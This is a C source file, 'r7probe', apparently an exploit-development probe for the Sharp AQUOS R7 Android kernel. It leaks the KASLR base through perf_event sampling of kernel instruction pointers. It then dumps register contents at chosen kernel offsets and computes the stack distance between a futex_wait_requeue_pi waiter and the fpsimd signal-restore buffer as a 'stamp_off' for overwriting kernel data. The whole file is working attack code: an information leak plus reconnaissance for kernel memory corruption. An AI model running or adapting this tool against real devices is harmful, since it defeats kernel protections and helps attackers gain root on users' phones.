/* r7probe — S1 calibration probe for AQUOS R7 (no baked offsets).
 *
 * Modes:
 *   r7probe kaslr                 : print runtime _text (KASLR leak, min-IP method)
 *   r7probe hist <loop>           : 64B-bucket histogram of kernel IPs during a loop
 *   r7probe dump <loop> <lo> <hi> : raw per-sample lines for kernel IPs in
 *                                   [text+lo, text+hi) (hex offsets, no 0x)
 * Loops: gettid | enforce | status | futex
 * Read-only: perf sampling + file reads + futex wait-again. No writes.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ARM64_REG_COUNT 33
#define ARM64_REG_MASK  ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
#define FUTEX_PRIVATE 128
#define WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE)

static uint64_t ring_u64(const uint8_t *ring, uint64_t rs, uint64_t pos) {
  uint64_t v, off = pos & (rs - 1);
  if (off + sizeof(v) <= rs) memcpy(&v, ring + off, sizeof(v));
  else { uint8_t b[8]; uint64_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, 8 - f); memcpy(&v, b, 8); }
  return v;
}

static long raw_futex(uint32_t *u, int op, uint32_t v, uint64_t to, uint32_t *u2, uint32_t v3) {
  return syscall(__NR_futex, u, op, v, to, u2, v3);
}

static int open_perf(uint64_t period, int with_regs, int excl_user) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = period;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  (with_regs ? PERF_SAMPLE_REGS_INTR : 0);
  if (with_regs) a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = excl_user;
  a.exclude_hv = 1;
  return (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
}

/* KASLR: lowest kernel IP seen during gettid storm -> align2M + 0x80000 */
static uint64_t kaslr_text(void) {
  int fd = open_perf(100000, 0, 0);
  if (fd < 0) { fprintf(stderr, "perf_open: %s\n", strerror(errno)); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 33;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 2000000; i++) syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = m->data_head, tail = m->data_tail, min = UINT64_MAX;
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h);
      uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
      if (ip >= UINT64_C(0xffff000000000000) && ip < min) min = ip;
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
        uint64_t x = ring_u64(ring, rs, pos); pos += 8;
        if (x >= UINT64_C(0xffff000000000000) && x < min) min = x;
      }
    }
    tail += h.size;
  }
  munmap(m, msz); close(fd);
  if (min == UINT64_MAX) return 0;
  printf("[*] kaslr min_ip=%016llx\n", (unsigned long long)min);
  /* R7: image is linked 2M-aligned at _text (System.map _text=ffffffc008000000),
   * KASLR slide is 2M-aligned => aligned_2M IS runtime _text (no +0x80000). */
  return (min & ~UINT64_C(0x1fffff));
}

static void sighandler_noop(int s) { (void)s; }

static void run_loop(int loop) {
  if (loop == 2) { /* enforce */
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0) { perror("enforce"); return; }
    char b[8];
    for (int i = 0; i < 30000; i++) {
      (void)syscall(__NR_lseek, fd, 0, SEEK_SET);
      (void)syscall(__NR_read, fd, b, sizeof(b));
    }
    close(fd);
  } else if (loop == 3) { /* status */
    int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
    if (fd < 0) { perror("status"); return; }
    static char s[4096];
    for (int i = 0; i < 30000; i++) {
      (void)syscall(__NR_lseek, fd, 0, SEEK_SET);
      (void)syscall(__NR_read, fd, s, sizeof(s));
    }
    close(fd);
  } else if (loop == 6) { /* sig: self-signal storm -> sigreturn/restore_fpsimd_context */
    signal(SIGUSR1, sighandler_noop);
    for (int i = 0; i < 30000; i++) (void)raise(SIGUSR1);
  } else if (loop == 5) { /* /proc/self/stat (get_task_stat -> task_state) */
    int fd = open("/proc/self/stat", O_RDONLY | O_CLOEXEC);
    if (fd < 0) { perror("stat"); return; }
    static char s[512];
    for (int i = 0; i < 30000; i++) {
      (void)syscall(__NR_lseek, fd, 0, SEEK_SET);
      (void)syscall(__NR_read, fd, s, sizeof(s));
    }
    close(fd);
  } else if (loop == 4) { /* futex */
    volatile int a1 = 1, a2 = 0;
    for (int i = 0; i < 30000; i++) (void)raw_futex((uint32_t *)&a1, WAIT_REQUEUE_PI_PRIVATE, 0, 0, (uint32_t *)&a2, 0);
  } else { /* gettid baseline */
    for (int i = 0; i < 200000; i++) syscall(__NR_gettid);
  }
}

static int loop_id(const char *s) {
  if (!strcmp(s, "gettid")) return 1;
  if (!strcmp(s, "enforce")) return 2;
  if (!strcmp(s, "status")) return 3;
  if (!strcmp(s, "futex")) return 4;
  if (!strcmp(s, "stat")) return 5;
  if (!strcmp(s, "sig")) return 6;
  return 0;
}

/* histogram mode */
#define MAXB 256
static void hist(int loop, uint64_t text) {
  int fd = open_perf(1000, 0, 1);
  if (fd < 0) { fprintf(stderr, "perf_open: %s\n", strerror(errno)); return; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  run_loop(loop);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size, tail = m->data_tail, head = m->data_head;
  static uint64_t buck[MAXB], cnt[MAXB]; int nb = 0;
  uint64_t nsamp = 0;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      nsamp++;
      uint64_t ip = ring_u64(ring, rs, tail + sizeof(h));
      if (ip >= UINT64_C(0xffff000000000000)) {
        uint64_t bkt = (ip - text) & ~UINT64_C(63);
        int i;
        for (i = 0; i < nb; i++) if (buck[i] == bkt) { cnt[i]++; break; }
        if (i == nb && nb < MAXB) { buck[i] = bkt; cnt[i] = 1; nb++; }
      }
    }
    tail += h.size;
  }
  printf("[*] samples=%llu kernel_ip_buckets=%d\n", (unsigned long long)nsamp, nb);
  /* top 30 */
  for (int k = 0; k < 30 && k < nb; k++) {
    int best = -1; uint64_t bc = 0;
    for (int i = 0; i < nb; i++) if (cnt[i] > bc) { bc = cnt[i]; best = i; }
    if (best < 0) break;
    printf("    +%08llx  %llu\n", (unsigned long long)buck[best], (unsigned long long)bc);
    cnt[best] = 0;
  }
  munmap(m, msz); close(fd);
}

/* dump mode */
static void dump(int loop, uint64_t text, uint64_t lo, uint64_t hi) {
  int fd = open_perf(1000, 1, 1);
  if (fd < 0) { fprintf(stderr, "perf_open: %s\n", strerror(errno)); return; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  run_loop(loop);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size, tail = m->data_tail, head = m->data_head;
  int shown = 0;
  while (tail + sizeof(struct perf_event_header) <= head && shown < 400) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, rs, pos); pos += 8;
      if (abi && ip >= text + lo && ip < text + hi &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        printf("ip=%016llx off=%08llx sp=%016llx", (unsigned long long)ip,
               (unsigned long long)(ip - text), (unsigned long long)ring_u64(ring, rs, pos + 31 * 8));
        for (int r = 0; r <= 10; r++) printf(" x%d=%016llx", r, (unsigned long long)ring_u64(ring, rs, pos + r * 8));
        for (int r = 19; r <= 29; r++) printf(" x%d=%016llx", r, (unsigned long long)ring_u64(ring, rs, pos + r * 8));
        printf("\n");
        shown++;
      }
    }
    tail += h.size;
  }
  printf("[*] dumped=%d\n", shown);
  munmap(m, msz); close(fd);
}

/* cr mode: find constant kernel-pointer registers inside window [base, base+range) */
static void crest(int loop, uint64_t text, uint64_t base, uint64_t range) {
  int fd = open_perf(1000, 1, 1);
  if (fd < 0) { fprintf(stderr, "perf_open: %s\n", strerror(errno)); return; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  run_loop(loop);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t n = 0;
  uint64_t first[ARM64_REG_COUNT]; int same[ARM64_REG_COUNT];
  for (int i = 0; i < ARM64_REG_COUNT; i++) { same[i] = 1; first[i] = 0; }
  /* also track per-register value-count for the top candidate */
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, rs, pos); pos += 8;
      if (abi && ip >= text + base && ip < text + base + range &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        if (n == 0) { for (int r = 0; r < ARM64_REG_COUNT; r++) first[r] = ring_u64(ring, rs, pos + r * 8); }
        else {
          /* for x0..x28 track constancy and kernel-static-range membership */
          for (int r = 0; r < ARM64_REG_COUNT; r++) {
            uint64_t v = ring_u64(ring, rs, pos + r * 8);
            if (v != first[r]) same[r] = 0;
          }
        }
        n++;
      }
    }
    tail += h.size;
  }
  printf("[*] cr samples_in_window=%llu\n", (unsigned long long)n);
  for (int r = 0; r < 31; r++) {
    if (same[r] && first[r]) {
      uint64_t v = first[r];
      int in_static = (v >= UINT64_C(0xffffff8000000000) && v < UINT64_C(0xffffffc000000000));
      printf("    const x%-2d = %016llx%s\n", r, (unsigned long long)v, in_static ? "  (kernel static/heap VA)" : "");
    }
  }
  munmap(m, msz); close(fd);
}

/* map mode: per (instruction-bucket, register) most-frequent value.
 * Finds "at this instruction, reg X stably holds VA Z". */
#define MB 128  /* buckets of 16B */
#define ME 4    /* entries per bucket/reg */
struct ment { uint64_t v; unsigned c; };
static void mapmode(int loop, uint64_t text, uint64_t lo, uint64_t hi, unsigned thr) {
  int nb = (int)((hi - lo) / 16); if (nb > MB) nb = MB;
  static struct ment tbl[MB][ARM64_REG_COUNT][ME];
  int fd = open_perf(1000, 1, 1);
  if (fd < 0) { fprintf(stderr, "perf_open: %s\n", strerror(errno)); return; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  run_loop(loop);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t nwin = 0;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, rs, pos); pos += 8;
      if (abi && ip >= text + lo && ip < text + lo + (uint64_t)nb * 16 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        int bkt = (int)((ip - (text + lo)) / 16);
        nwin++;
        for (int r = 0; r < ARM64_REG_COUNT; r++) {
          uint64_t v = ring_u64(ring, rs, pos + r * 8);
          struct ment *e = tbl[bkt][r];
          int i;
          for (i = 0; i < ME; i++) if (e[i].c && e[i].v == v) { e[i].c++; break; }
          if (i == ME) {
            for (i = 0; i < ME; i++) if (!e[i].c) { e[i].v = v; e[i].c = 1; break; }
            if (i == ME) { /* replace min-count */
              int mi = 0; for (int j = 1; j < ME; j++) if (e[j].c < e[mi].c) mi = j;
              e[mi].v = v; e[mi].c = 1;
            }
          }
        }
      }
    }
    tail += h.size;
  }
  printf("[*] map samples_in_window=%llu window=+%llx..+%llx thr=%u\n",
         (unsigned long long)nwin, (unsigned long long)lo,
         (unsigned long long)(lo + nb * 16), thr);
  for (int bkt = 0; bkt < nb; bkt++) {
    for (int r = 0; r < 32; r++) {
      struct ment *e = tbl[bkt][r];
      int best = -1; unsigned bc = 0;
      for (int j = 0; j < ME; j++) if (e[j].c > bc) { bc = e[j].c; best = j; }
      if (best >= 0 && bc >= thr) {
        uint64_t v = e[best].v;
        const char *tag = "";
        if (v >= UINT64_C(0xffffff8000000000) && v < UINT64_C(0xffffffc000000000)) tag = " [dirmap/static]";
        else if (v >= UINT64_C(0xffff800000000000) && v < UINT64_C(0xffffff8000000000)) tag = " [vmalloc/stack?]";
        else if (v && v < UINT64_C(0x100000000000)) tag = " [user]";
        printf("    +%06llx x%-2d = %016llx  (%u)%s\n",
               (unsigned long long)(lo + bkt * 16), r, (unsigned long long)v, bc, tag);
      }
    }
  }
  munmap(m, msz); close(fd);
}

/* geo mode: one process, two loops.  Dominant in-function SP of
 * futex_wait_requeue_pi (window a) and of restore_fpsimd_context during a
 * SIGUSR1 storm (window b).  Both sit on the SAME thread stack under the
 * exception-entry pt_regs, so:
 *   waiter      = SP_futex + 0x90      (disasm: x1 = sp+0x90 at call)
 *   vregs_dest  = SP_fpsimd + 0x10     (memset target is the fpsimd_context)
 *   stamp_off   = waiter - vregs_dest  (where to stamp fp->vregs[...]) */
static uint64_t dominant_sp(int loop, uint64_t text, uint64_t lo, uint64_t hi) {
  int fd = open_perf(1000, 1, 1);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t msz = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  run_loop(loop);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t cand[8] = {0}; unsigned cnt[8] = {0};
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else { uint8_t b[sizeof(h)]; size_t f = rs - off; memcpy(b, ring + off, f); memcpy(b + f, ring, sizeof(h) - f); memcpy(&h, b, sizeof(h)); }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, rs, pos); pos += 8;
      if (abi && ip >= text + lo && ip < text + hi &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t sp = ring_u64(ring, rs, pos + 31 * 8);
        unsigned i;
        for (i = 0; i < 8 && cand[i] && cand[i] != sp; i++);
        if (i < 8) { cand[i] = sp; cnt[i]++; }
      }
    }
    tail += h.size;
  }
  munmap(m, msz); close(fd);
  unsigned best = 0;
  for (unsigned i = 1; i < 8; i++) if (cnt[i] > cnt[best]) best = i;
  return cnt[best] ? cand[best] : 0;
}

int main(int argc, char **argv) {
  if (argc < 2) { fprintf(stderr, "usage: %s kaslr | hist <loop> | dump <loop> <lo> <hi>\n", argv[0]); return 2; }
  uint64_t text = kaslr_text();
  if (!text) { fprintf(stderr, "[-] KASLR leak failed\n"); return 1; }
  printf("[*] text=%016llx\n", (unsigned long long)text);
  if (!strcmp(argv[1], "kaslr")) return 0;
  if (!strcmp(argv[1], "geo")) {
    uint64_t a = dominant_sp(4, text, 0x294948 + 0x80, 0x294948 + 0x380);
    uint64_t b = dominant_sp(6, text, 0x832d4, 0x83a9c);
    printf("[*] SP_futex=%016llx  SP_fpsimd_buf=%016llx\n",
           (unsigned long long)a, (unsigned long long)b);
    if (a && b) {
      uint64_t waiter = a + 0x90, vregs = b + 0x10;
      printf("[+] waiter_abs=%016llx vregs_copy_start=%016llx stamp_off=%+lld (0x%llx)\n",
             (unsigned long long)waiter, (unsigned long long)vregs,
             (long long)(waiter - vregs),
             (unsigned long long)(waiter >= vregs ? waiter - vregs : 0));
    }
    return 0;
  }
  if (argc < 3) { fprintf(stderr, "need loop\n"); return 2; }
  int loop = loop_id(argv[2]);
  if (!loop) { fprintf(stderr, "bad loop\n"); return 2; }
  if (!strcmp(argv[1], "hist")) { hist(loop, text); return 0; }
  if (!strcmp(argv[1], "cr")) {
    if (argc < 5) { fprintf(stderr, "cr needs base range\n"); return 2; }
    crest(loop, text, strtoull(argv[3], NULL, 16), strtoull(argv[4], NULL, 16));
    return 0;
  }
  if (!strcmp(argv[1], "map")) {
    if (argc < 5) { fprintf(stderr, "map needs lo hi [thr]\n"); return 2; }
    unsigned thr = argc >= 6 ? (unsigned)strtoul(argv[5], NULL, 0) : 15;
    mapmode(loop, text, strtoull(argv[3], NULL, 16), strtoull(argv[4], NULL, 16), thr);
    return 0;
  }
  if (!strcmp(argv[1], "dump")) {
    if (argc < 5) { fprintf(stderr, "dump needs lo hi\n"); return 2; }
    dump(loop, text, strtoull(argv[3], NULL, 16), strtoull(argv[4], NULL, 16));
    return 0;
  }
  return 2;
}
